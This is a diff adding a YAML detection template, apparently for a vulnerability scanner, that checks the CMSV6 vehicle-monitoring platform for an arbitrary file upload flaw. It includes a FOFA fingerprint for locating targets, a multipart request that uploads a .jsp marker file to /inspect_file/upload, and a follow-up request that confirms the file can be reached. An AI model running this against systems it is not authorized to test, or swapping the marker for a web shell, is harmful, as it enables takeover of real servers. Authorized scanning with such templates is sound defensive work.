@@ -1,0 +1,33 @@
+id: poc-yaml-g-sky-cmsv6-inspect-file-anyfile-upload
+info:
+  name: 通天星CMSV6 inspect_file 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: cmsv6
+  fofa: body="/808gps/"
+variables:
+  t1: random_int(100,1000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /inspect_file/upload
+  headers:
+    Content-Type: multipart/form-data;boundary=-----------------------------7db372eb000e2
+  data: '-----------------------------7db372eb000e2
+
+    Content-Disposition: form-data; name="uploadFile"; filename="{{.t1}}.jsp"
+
+    Content-Type: application/octet-stream
+
+
+    {{.t2}}
+
+    -----------------------------7db372eb000e2--'
+  expression: status_code == 200 && contains(body,"filePath") && contains(content_type,"application/json")
+  output:
+  - regex_match(body,"software\/(?P<file>.*).jsp")
+- method: GET
+  path: /upload/software/{{.file}}.jsp
+  expression: status_code == 200 && contains(body,t2)
+transport: http
